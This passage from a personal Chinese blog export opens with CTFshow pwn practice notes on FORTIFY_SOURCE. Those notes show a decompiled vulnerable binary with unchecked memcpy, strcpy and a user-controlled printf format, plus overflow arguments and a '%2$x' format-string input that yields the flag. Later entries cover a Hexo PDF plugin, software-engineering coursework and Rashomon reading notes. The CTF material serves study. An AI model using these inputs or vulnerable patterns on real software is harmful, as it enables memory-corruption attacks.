<li>FORTIFY_SOURCE 会在编译时自动将长度检查代码插入到一些危险的库函数中，例如 strcpy 、 strcat 、 sprintf 等。这些代码会检查目标缓冲区的长度，以确保操作不会导致溢出。如果检测到溢出情况，程序会立即终止，从而防止潜在的漏洞利用。</li>
</ul>
</li>
<li>
<p><strong>2. 缓冲区溢出检测</strong>：</p>
<ul>
<li>FORTIFY_SOURCE 还会将额外的保护机制添加到一些敏感的库函数中，例如 memcpy 、 memmove 、 memset 等。这些机制可以检测传递给这些函数的源和目标缓冲区是否有重叠，并防止潜在的缓冲区溢出</li>
</ul>
</li>
<li>
<p><strong>3. 安全警告和错误报告：</strong></p>
<ul>
<li>当 FORTIFY_SOURCE 检测到潜在的缓冲区溢出或其他安全问题时，它会生成相应的警告和错误报告</li>
</ul>
</li>
<li>
<p>FORTIFY_SOURCE 提供了一层额外的安全保护，它可以在很大程度上减少常见的缓冲区溢出和字符串操作相关的安全漏洞</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn032/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位  仅关闭Canary保护</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+4h] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">11</span>]; <span class="comment">// [rsp+Ah] [rbp-3Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">11</span>]; <span class="comment">// [rsp+15h] [rbp-33h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = getegid();</span><br><span class="line">  setresgid(v3, v3, v3);</span><br><span class="line">  logo();</span><br><span class="line">  v4 = argv[<span class="number">1</span>];</span><br><span class="line">  *(_QWORD *)buf1 = *(_QWORD *)v4;</span><br><span class="line">  *(_WORD *)&amp;buf1[<span class="number">8</span>] = *((_WORD *)v4 + <span class="number">4</span>);</span><br><span class="line">  buf1[<span class="number">10</span>] = v4[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, <span class="string">&quot;CTFshowPWN&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  v5 = strtol(argv[<span class="number">3</span>], <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(buf1, argv[<span class="number">2</span>], v5);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  fgets(buf1, <span class="number">11</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(buf1, &amp;num);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; <span class="number">4</span> )</span><br><span class="line">    Undefined();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 第一题关闭了此保护，输入的argv1明显会导致buf1溢出，但是程序仍可以正常运行 */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">Undefined</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;The source code of these three programs is the same, and the results of turning on different levels of protection are understood\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You should understand the role of these protections!But don&#x27;t just get a flag\nHere is your flag:\n&quot;</span>);</span><br><span class="line">  v0 = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="number">64</span>, v0);</span><br><span class="line">  <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 打开并打印flag */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./pwn AAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB 6</span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB CTFshowPWN</span><br><span class="line">A AAAAAAAAAAA</span><br><span class="line">%2$x</span><br><span class="line">be8b8d0</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>
<ul>
<li>这个知识点不太懂。。</li>
</ul>
<h3 id="033-FORTIFY-SOURCE-1"><a class="header-anchor" href="#033-FORTIFY-SOURCE-1">¶</a>033 FORTIFY_SOURCE=1</h3>
<ul>
<li>启用 Fortify 功能的基本级别。</li>
<li>在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。 在运行时进行某些检查，如检测函数返回值和大小的一致性。 如果检测到潜在的安全问题，会触发运行时错误，并终止程序执行</li>
</ul>
<p>to be continued</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>Pwn notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【hexo】添加pdf</title>
    <url>/2024/07/13/CS_Notes/hexo/%E3%80%90hexo%E3%80%91%E6%B7%BB%E5%8A%A0pdf/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>尝试在hexo中插入pdf，可在当前页面浏览【此处缺少效果图】</p>
<h3 id="第一步"><a class="header-anchor" href="#第一步">¶</a>第一步</h3>
<ul>
<li>
<p>首先打开 <a href="https://hexo.io/plugins/">Plugins | Hexo</a> ，搜索pdf</p>
</li>
<li>
<p>然后就会找到唯一一个匹配项：<a href="https://github.com/superalsrk/hexo-pdf/">hexo-pdf</a></p>
</li>
</ul>
<h3 id="第二步"><a class="header-anchor" href="#第二步">¶</a>第二步</h3>
<ul>
<li>
<p><code>win+r</code></p>
</li>
<li>
<p><code>Ctrl+Shift+Enter</code> 以管理员身份打开cmd</p>
</li>
<li>
<p>cd到<code>hexo</code>目录</p>
</li>
<li>
<p><code>$ npm install --save hexo-pdf</code> 安装插件</p>
</li>
</ul>
<h3 id="第三步"><a class="header-anchor" href="#第三步">¶</a>第三步</h3>
<h4 id="插件提供三种方法"><a class="header-anchor" href="#插件提供三种方法">¶</a>插件提供三种方法</h4>
<ul>
<li>
<p>第一种 Normal PDF   没成功</p>
<ul>
<li><code>&#123;% pdf http://7xov2f.com1.z0.glb.clouddn.com/bash_freshman.pdf %&#125; </code></li>
<li>第一个是链接引入，但是链接失效了，不知道咋搞的，先跳过</li>
<li><code>&#123;% pdf http://7xov2f.com1.z0.glb.clouddn.com/bash_freshman.pdf %&#125;</code></li>
<li>第二个是引入本地pdf，看样子是放在<code>hexo</code>下某个位置，但是没试出来， so跳过（废×</li>
</ul>
</li>
<li>
<p>第二种  Google drive</p>
<ul>
<li><code>&#123;% pdf https://drive.google.com/file/d/0B6qSwdwPxPRdTEliX0dhQ2JfUEU/preview %&#125;</code></li>
<li>把文件传到云端硬盘，但是点开链接，发现需要申请访问权限emmmm</li>
<li>so跳过（废×</li>
</ul>
</li>
<li>
<p>第三种  SlideShare  √take</p>
</li>
</ul>
<h4 id="SlideShare"><a class="header-anchor" href="#SlideShare">¶</a>SlideShare</h4>
<h5 id="示例"><a class="header-anchor" href="#示例">¶</a>示例</h5>
<ul>
<li>
<p><code>&#123;% pdf http://www.slideshare.net/slideshow/embed_code/key/8Jl0hUt2OKUOOE %&#125;</code></p>
</li>
<li>
<p>复制其中链接可以直接开始浏览文件</p>
</li>
</ul>
<h5 id="Step-1-注册，上传文件"><a class="header-anchor" href="#Step-1-注册，上传文件">¶</a>Step 1   注册，上传文件</h5>
<ul>
<li>访问<code>http://www.slideshare.net</code>（需要魔法访问）</li>
<li>用Google账号注册，登录</li>
<li>右上角Upload，将文件拖拽到指定区域，随便填写一些信息上传</li>
<li>上传成功后点击右上角个人头像，打开<code>My Uploads</code>，点开刚刚上传得到pdf，苯人的第一次试验文件链接是<code>https://www.slideshare.net/slideshow/linux-saveqimo-dontlook-thanku-testhexo2024-pdf/270211532</code>，可以看到文件名有显示出来，但是这个链接跟上面的示例不是一个格式，用这个链接多次尝试也无法在<code>hexo s</code>显示</li>
<li>【因为苯人还不会插本地图片【感谢好友hsad提醒^^文件上传】】所以此处缺少很多示例图片</li>
</ul>
<h5 id="Step-2-提取可访问链接"><a class="header-anchor" href="#Step-2-提取可访问链接">¶</a>Step 2   提取可访问链接</h5>
<ul>
<li>
<p>在<code>https://www.slideshare.net/slideshow/linux-saveqimo-dontlook-thanku-testhexo2024-pdf/270211532</code> ，找到【…】按钮，选择<code>share</code>，复制<code>Embed</code>部分内容</p>
<p>复制内容如下：</p>
</li>
<li>
<p><code>&lt;iframe src=&quot;https://www.slideshare.net/slideshow/embed_code/key/3CgGrJHCWZ1orO?startSlide=1&quot; width=&quot;597&quot; height=&quot;486&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px;max-width: 100%;&quot; allowfullscreen&gt;&lt;/iframe&gt;&lt;div style=&quot;margin-bottom:5px&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://www.slideshare.net/slideshow/linux-saveqimo-dontlook-thanku-testhexo2024-pdf/270211532&quot; title=&quot;Linux-saveQiMo-dontLook-thanku-testhexo2024.pdf&quot; target=&quot;_blank&quot;&gt;Linux-saveQiMo-dontLook-thanku-testhexo2024.pdf&lt;/a&gt;&lt;/strong&gt; from &lt;strong&gt;&lt;a href=&quot;https://www.slideshare.net/1300672728&quot; target=&quot;_blank&quot;&gt;1300672728&lt;/a&gt;&lt;/strong&gt;&lt;/div&gt;</code></p>
</li>
<li>
<p>在这一大串东西里面有一串可疑链接，跟示例很像，遂提取出来：</p>
</li>
<li>
<p><code>https://www.slideshare.net/slideshow/embed_code/key/3CgGrJHCWZ1orO?startSlide=1</code>【这个startSlide留着也行】</p>
</li>
</ul>
<h5 id="Step-3-插件使用与测试"><a class="header-anchor" href="#Step-3-插件使用与测试">¶</a>Step 3   插件使用与测试</h5>
<ul>
<li><code>&#123;% pdf https://www.slideshare.net/slideshow/embed_code/key/3CgGrJHCWZ1orO?startSlide=1 %&#125;</code></li>
<li>然后本地和github page测试，都可以显示【此处暂缺少效果图hhh】，over了</li>
</ul>
<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
<ul>
<li>
<p>搞完才找到教程（汗）</p>
</li>
<li>
<p>此处贴上链接，作为后续SlideShare方法失效（没找到相关信息，比如文件保存期限，文件数量上限啥的）的辅助方法</p>
</li>
<li>
<p><a href="https://blog.csdn.net/wugenqiang/article/details/88377669">使用 Github 空间搭建 Hexo 技术博客——Hexo NexT主题内添加pdf 插件（十一）_hexo next添加github上的插件-CSDN博客</a></p>
</li>
<li>
<p>这个教程的方法还有下载功能，goodgood</p>
</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>hexo notes</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>CS Notes</tag>
      </tags>
  </entry>
  <entry>
    <title>【课内】软件工程导论</title>
    <url>/2024/08/26/CS_Notes/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA/%E3%80%90%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0%E3%80%91%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>1</p>
<h1>软件工程导论</h1>
]]></content>
      <categories>
        <category>notes</category>
        <category>Software Engineering notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>软件工程导论</tag>
      </tags>
  </entry>
  <entry>
    <title>【软件工程导论】课程作业记录</title>
    <url>/2024/09/01/CS_Notes/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA/%E3%80%90%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA%E3%80%91%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>软件工程导论</li>
</ul>
<h1>第一次课程作业</h1>
<h2 id="软件复杂性问题"><a class="header-anchor" href="#软件复杂性问题">¶</a>软件复杂性问题</h2>
<ul>
<li>任务：阅读ppt中关于软件复杂性问题的解释</li>
</ul>
<hr>
<h3 id="软件复杂性的组成"><a class="header-anchor" href="#软件复杂性的组成">¶</a>软件复杂性的组成</h3>
<ol>
<li>软件固有复杂性</li>
<li>管理开发过程的困难</li>
<li>软件可能的灵活性</li>
<li>表征离散系统行为的困难</li>
</ol>
<h2 id="对软件科学的贡献"><a class="header-anchor" href="#对软件科学的贡献">¶</a>对软件科学的贡献</h2>
<ul>
<li>任务：了解司马贺、图灵等科学家对软件科学的重要贡献</li>
</ul>
<hr>
<h2 id="人月神话节选阅读"><a class="header-anchor" href="#人月神话节选阅读">¶</a>人月神话节选阅读</h2>
<ul>
<li>任务：从人月神话中任选1章阅读</li>
</ul>
<hr>
<ul>
<li>
<p>读了人月神话那一章，有点启发</p>
</li>
<li>
<p>附上AI提供的书籍概览：</p>
<ul>
<li>《人月神话》（“The Mythical Man-Month”）是计算机科学领域内的一本经典著作，由美国计算机科学家Frederick P. Brooks, Jr.撰写。这本书首次出版于1975年，基于Brooks在IBM期间作为系统/360家族和OS/360操作系统项目管理者的经验。书中探讨了软件项目管理中的诸多问题，特别是关于人员管理以及如何有效组织开发团队。</li>
<li>书中的核心观点之一是“Brooks定律”，即：“向已经延迟的软件项目增加人手会使项目更加延迟。” 这一定律强调了在软件开发过程中盲目增加人力可能会带来的负面效果，因为新的团队成员需要时间来熟悉项目，而且随着团队规模的扩大，沟通的成本也会增加。</li>
<li>此外，《人月神话》还讨论了诸如软件估算、模块化设计、可维护性以及个人在团队中的作用等主题。这本书不仅对软件项目经理有启发，对于所有参与软件开发过程的人来说都是必读的经典之作。</li>
</ul>
</li>
</ul>
<h2 id="了解软件工程发展前沿"><a class="header-anchor" href="#了解软件工程发展前沿">¶</a>了解软件工程发展前沿</h2>
<ul>
<li>任务：阅读软件工程论文，了解软件工程发展前沿</li>
</ul>
<p>论文还没读</p>
<h1>技能提升作业报告</h1>
<blockquote>
<p>需要实验内容和结果</p>
</blockquote>
<h2 id="甘特图"><a class="header-anchor" href="#甘特图">¶</a>甘特图</h2>
<ul>
<li>任务：用甘特图制定完成某件事的计划</li>
</ul>
<h3 id="what-is-甘特图"><a class="header-anchor" href="#what-is-甘特图">¶</a>what is 甘特图</h3>
<ul>
<li>一种条状图，直观展示项目进展随时间的走势及联系</li>
<li>项目时间由横轴表示，项目活动由纵轴表示</li>
<li>整体线条表示整个项目期间内，计划和实际的活动完成情况</li>
<li></li>
</ul>
<h3 id="甘特图制作流程"><a class="header-anchor" href="#甘特图制作流程">¶</a>甘特图制作流程</h3>
<ol>
<li>创建任务表。其中包含项目主要元素，<strong><u>任务名称</u></strong>、<strong><u>持续时间</u></strong>、**<u>工期</u>**等</li>
<li>（传统：用Excel制作）</li>
<li>我用的亿图图示，导入模板，进行调整</li>
</ol>
<h2 id="数据流图"><a class="header-anchor" href="#数据流图">¶</a>数据流图</h2>
<ul>
<li>任务：根据你熟悉的某一应用，画出系统的数据流图</li>
</ul>
<h3 id="数据流图的概念"><a class="header-anchor" href="#数据流图的概念">¶</a>数据流图的概念</h3>
<ul>
<li>数据流图（Data Flow Diagram，DFD）是一种图形化技术，它描绘<strong>信息流</strong>和<strong>数据</strong>从<strong>输入移动到输出的过程</strong>中所经受的变换</li>
</ul>
<h3 id="数据流图的优点"><a class="header-anchor" href="#数据流图的优点">¶</a>数据流图的优点</h3>
<ul>
<li>没有任何具体的物理元素，只是描绘信息在软件中流动和被处理的情况</li>
<li>是系统逻辑功能的图形表示，易理解，是分析员与用户之间极好的沟通工具</li>
<li>必须完成的基本逻辑功能，不需考虑怎样具体实现</li>
<li>可以在任何抽象层次上被用来表示系统或软件；可以被分层次地画，层次越低，表现出的信息流细节和功能细节也越多</li>
</ul>
<h3 id="数据流图的基本符号"><a class="header-anchor" href="#数据流图的基本符号">¶</a>数据流图的基本符号</h3>
<ul>
<li>正方形（或立方体）表示<strong>数据的源点或终点</strong></li>
<li>圆角矩形（或圆形）代表<strong>变换数据的处理</strong></li>
<li>开口矩形（或两条平行横线）代表<strong>数据存储</strong></li>
<li>箭头表示数据流，即<strong>特定数据的流动方向</strong></li>
</ul>
<h3 id="数据流图的注意事项"><a class="header-anchor" href="#数据流图的注意事项">¶</a>数据流图的注意事项</h3>
<ul>
<li>在数据流图中应该描绘<u>所有可能的数据流向</u>，而不应该描绘出现某个数据流的条件</li>
<li><strong>处理</strong>并不一定是一个程序
<ul>
<li>一个处理框可以代表一系列程序、单个程序或者程序的一个模块</li>
</ul>
</li>
<li>一个<strong>数据存储</strong>也并不等同于一个文件
<ul>
<li>可以表示一个文件、文件的一部分、数据库的元素、记录的一部分等</li>
</ul>
</li>
<li>数据存储和数据流都是数据，仅仅所处的状态不同
<ul>
<li><strong>数据存储</strong>是处于静止状态的数据</li>
<li><strong>数据流</strong>是处于运动中的数据</li>
</ul>
</li>
<li>通常在数据流图中忽略出错处理，也不包括诸如打开或关闭文件之类的内务处理
<ul>
<li>数据流图的基本要点：描绘“做什么”而不考虑“怎样做”</li>
</ul>
</li>
</ul>
<h3 id="数据流图的成分分析"><a class="header-anchor" href="#数据流图的成分分析">¶</a>数据流图的成分分析</h3>
<ul>
<li><strong><u>源点和终点</u></strong>、<strong><u>处理</u></strong>、<strong><u>数据存储</u><strong>和</strong><u>数据流</u></strong>
<ul>
<li><a href="https://blog.csdn.net/I_r_o_n_M_a_n/article/details/121309525?ops_request_misc=%7B%22request%5Fid%22%3A%22A7C6EE2F-C1B8-4829-97BC-0D6ECB69352E%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=A7C6EE2F-C1B8-4829-97BC-0D6ECB69352E&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-121309525-null-null.142%5Ev100%5Epc_search_result_base2&amp;utm_term=%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE&amp;spm=1018.2226.3001.4187">软件工程 – 数据流图的画法_数据流图怎么画-CSDN博客</a>    <strong>2.示例：工厂订单报表</strong></li>
</ul>
</li>
</ul>
<h3 id="画数据流图"><a class="header-anchor" href="#画数据流图">¶</a>画数据流图</h3>
<ul>
<li>按照上面四种数据类型进行<strong>成分分离</strong>后，开始着手画数据流图</li>
</ul>
<blockquote>
<p>计算机系统本质上都是把输入数据变换成输出数据</p>
<p>任何系统的基本模型都由若干个数据源点/终点以及一个处理组成</p>
</blockquote>
<ul>
<li><u>顶层数据流图</u>（<strong>突出表明了数据的源点和终点</strong>）
<ul>
<li>是否列出了所有给定的数据源点 / 终点</li>
</ul>
</li>
<li><u>第0层数据流图</u>（<strong>描绘系统的主要功能</strong>）
<ul>
<li>给处理和数据存储都加了编号</li>
<li>目的：便于引用和追踪</li>
</ul>
</li>
<li><u>第1层数据流图</u>（<strong>对功能级数据流图中描绘的系统主要功能进一步细化</strong>）
<ul>
<li>当进一步分解将<u>涉及如何具体地实现一个功能</u>时，就不应该再分解了</li>
<li>在对数据流图分层细化时必须保持<strong>信息连续性</strong>，即当把一个处理分解为一系列处理时，分解前和分解后的<strong>输入/输出数据流</strong>必须相同</li>
</ul>
</li>
</ul>
<h3 id="数据流图命名规范"><a class="header-anchor" href="#数据流图命名规范">¶</a>数据流图命名规范</h3>
<h4 id="数据流（或数据存储）命名"><a class="header-anchor" href="#数据流（或数据存储）命名">¶</a>数据流（或数据存储）命名</h4>
<ul>
<li>应代表整个数据流（或数据存储）的内容，而不是仅反映某些成分</li>
<li>不要使用空洞、缺乏具体含义的名字（如“数据”、“信息”、“输入”之类）</li>
<li>如果在为某个数据流（或数据存储）起名字时遇到了困难，则很可能是因为<u>对数据流图分解不恰当</u>造成的，应该试试<u>重新分解</u>，看是否能克服这个困难</li>
</ul>
<h4 id="处理命名"><a class="header-anchor" href="#处理命名">¶</a>处理命名</h4>
<ul>
<li>
<p>通常先为<strong>数据流</strong>命名，然后再为<strong>与之相关联的处理</strong>命名</p>
<blockquote>
<p>体现了人类习惯的“由表及里”的思考过程</p>
</blockquote>
</li>
<li>
<p>反映<strong>整个处理</strong>的功能，而不是它的一部分功能</p>
</li>
<li>
<p>最好由一个具体的<strong>及物动词</strong>加上一个具体的<strong>宾语</strong>组成</p>
<ul>
<li>尽量避免使用“加工”、“处理”等空洞笼统的动词作为名字</li>
</ul>
</li>
<li>
<p>通常名字中<strong>仅包括一个动词</strong></p>
<ul>
<li>如果必须用两个动词才能描述整个处理的功能，则把这个处理再分解成两个处理可能更恰当些</li>
</ul>
</li>
<li>
<p>如果在为某个处理命名时遇到困难，则很可能是发现了<strong>分解不当</strong>的迹象，应考虑重新分解</p>
</li>
</ul>
<h2 id="UML图中的类图和活动图"><a class="header-anchor" href="#UML图中的类图和活动图">¶</a>UML图中的类图和活动图</h2>
<ul>
<li>任务：使用绘制数据流图的需求为背景，画出UML图中的类图和活动图</li>
</ul>
<h2 id="自动识别不合规范的代码"><a class="header-anchor" href="#自动识别不合规范的代码">¶</a>自动识别不合规范的代码</h2>
<ul>
<li>任务：使用Java或其他代码格式控制工具，对不符合规范的代码进行自动识别，给出提示（java代码规范不做要求，但是应当具有权威性，如阿里的java代码规范）</li>
</ul>
<h2 id="软件测试"><a class="header-anchor" href="#软件测试">¶</a>软件测试</h2>
<ul>
<li>任务：使用Junit 和 Jmeter对某一软件完成相应测试</li>
</ul>
<h2 id="Maven打包工具"><a class="header-anchor" href="#Maven打包工具">¶</a>Maven打包工具</h2>
<ul>
<li>任务：使用Maven打包工具</li>
</ul>
<h2 id="结论分析"><a class="header-anchor" href="#结论分析">¶</a>结论分析</h2>
<h1>参考材料</h1>
<h2 id="甘特图-v2"><a class="header-anchor" href="#甘特图-v2">¶</a>甘特图</h2>
<ul>
<li>甘特图制作流程学习  <a href="https://blog.csdn.net/asdn_123/article/details/109539008">如何用Excel快速制作甘特图？（超详细！）_表格如何一键生成甘特图-CSDN博客</a></li>
<li>快速了解甘特图     <a href="https://blog.csdn.net/bby2017/article/details/127870882?ops_request_misc=%7B%22request%5Fid%22%3A%22E37E2584-3B6B-408E-8CA9-98DCCD76E8BE%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=E37E2584-3B6B-408E-8CA9-98DCCD76E8BE&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127870882-null-null.142%5Ev100%5Epc_search_result_base2&amp;utm_term=%E7%94%98%E7%89%B9%E5%9B%BE&amp;spm=1018.2226.3001.4187">甘特图是什么？如何快速搭建？_甘特图基于什么数据。-CSDN博客</a></li>
</ul>
<h2 id="数据流图-v2"><a class="header-anchor" href="#数据流图-v2">¶</a>数据流图</h2>
<ul>
<li>数据流图的概念和示例     <a href="https://blog.csdn.net/I_r_o_n_M_a_n/article/details/121309525?ops_request_misc=%7B%22request%5Fid%22%3A%22A7C6EE2F-C1B8-4829-97BC-0D6ECB69352E%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=A7C6EE2F-C1B8-4829-97BC-0D6ECB69352E&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-121309525-null-null.142%5Ev100%5Epc_search_result_base2&amp;utm_term=%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE&amp;spm=1018.2226.3001.4187">软件工程 – 数据流图的画法_数据流图怎么画-CSDN博客</a></li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>Software Engineering notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>软件工程导论</tag>
      </tags>
  </entry>
  <entry>
    <title>《罗生门》读书摘记</title>
    <url>/2024/07/04/reading/%E5%A4%96%E5%9B%BD%E6%96%87%E5%AD%A6/%E6%97%A5%E6%9C%AC%E6%96%87%E5%AD%A6/%E3%80%8A%E7%BD%97%E7%94%9F%E9%97%A8%E3%80%8B%E8%AF%BB%E4%B9%A6%E6%91%98%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>这本书好像是芥川龙之介的作品集，只是以最出门的《罗生门》命名，其中包含了《罗生门》《鼻》《手帕》《地狱变》《蛛丝》《橘》《舞会》《密林中》《矿车》《阿富的贞操》《一篇爱情小说》《单相思》《侏儒警语》等文章。</p>
<p>目前看到的部分是《地狱变》 读起来感觉是跟《罗生门》一样印象深刻的作品。</p>
<p>本文是以上作品的一些句子摘录以及一些可能对自分の文学创作（？有益的批注</p>
<h3 id="摘录始于此"><a class="header-anchor" href="#摘录始于此">¶</a>摘录始于此</h3>
<h4 id="译本序"><a class="header-anchor" href="#译本序">¶</a>译本序</h4>
<p>书山稗（bai四）海，文史苑囿（you四），于中沉潜含玩，钩沉抉隐，一旦发而为文，自是信手拈来。随机生发，纵横捭（bai三）阖，不可抑勒。从王侯衙役到市井小民，从寺院高僧到天主教徒，从紫宸之深到江湖之远，在其笔下无不呼之即来，腾跃纸上。</p>
<ul>
<li>
<p>钩沉抉隐：“钩沉”与“抉隐”意思相近，都有“探索深奥的道理或散失的内容”的意思</p>
</li>
<li>
<p>沉潜：①在水里潜伏、沉没。②思想感情深沉，不外露。③集中精神；潜心</p>
</li>
</ul>
<p>值得注意的是，芥川的历史题材小说并非为了演绎历史典故和翻拍历史人物，而是身披历史戏装的“现代小说”，目的在于借古喻今，针砭时弊，臧否人物，传达现代人的生命窘态和灵魂质地。……原典出入自如，布局浑然天成，主题独出机杼，笔致摇曳生姿。</p>
<ul>
<li>臧否：①褒贬，评论   ②善恶</li>
</ul>
<p>芥川生性敏感，纵然一件司空见惯的小事，也往往使其脆弱的神经震颤良久。一般来说，他不重描绘而意在发觉，疏于叙述而工于点化。少的是轻灵与潇洒，多的是沉郁与悲凉。</p>
<p>无论得于史料之作，还是拾于现实之篇，其一以贯之者，大约是以下两条主线。一是对人性中“恶”的暴露、揶揄和鞭挞。第二条主线便是对人对人生的幻灭感亦即厌世主义倾向所导致的对艺术的执着与痴迷，这或许也是出于对前者的一种补偿心理。</p>
<p>尤为可贵的是，“他有意识地创造了文体——不是陈陈相因（的文体，而是一扫庸俗气味的艺术文体”（中村真一郎语），堪称典型的艺术至上者。</p>
<ul>
<li>陈陈相因：粮仓里的米谷一年接一年地堆积起来。比喻沿袭老一套，没有改进。</li>
</ul>
<p>可以说，对中国古典的向往和对中国现实的鄙视是芥川“中国认识”的一对矛盾。前者使之怀有文化上的自卑，后者催生其现实中的傲慢（“日本优越论”）。这其实也是日本近现代主流知识分子或精英阶层共同的基本倾向，纵令夏目漱石亦不例外。愈到后来，自卑愈见其轻而傲慢愈见其烈，在结果上成为日本对外扩张和侵华战争所以顺利推进的重要思想舆论资源和社会基础。</p>
<ul>
<li>
<p>纵令：即使——用在偏正复句的偏句，表示假设的让步，即退一步提出某种情况。  例句：纵令失败，我们也要继续实验。</p>
</li>
<li>
<p>黄钟大吕：形容音乐或言辞庄严、正大、高妙、和谐。  例句：①这首乐曲饱含一种黄钟大吕的气势。  ②他的这篇短文十分朴素，却如黄钟大吕，震撼人心。  ③堪称黄钟大吕的鸿篇巨制</p>
</li>
</ul>
<h4 id="鼻"><a class="header-anchor" href="#鼻">¶</a>鼻</h4>
<p>人的内心存在两种相互矛盾的情感。无疑，没有人不同情他人的不幸。可是，一旦对方好歹从不幸中挣扎出来，却又因此产生若有所失的怅惘。说得夸张一点，甚至出现一种想使之重新陷入不幸的心理。于是，不觉之间开始对其怀有某种敌意，尽管是消极的敌意。不知个中缘由的内供之所以怏怏不快，无非是因为他从池尾僧俗的态度中，隐隐觉察出了这些旁观者的利己主义。</p>
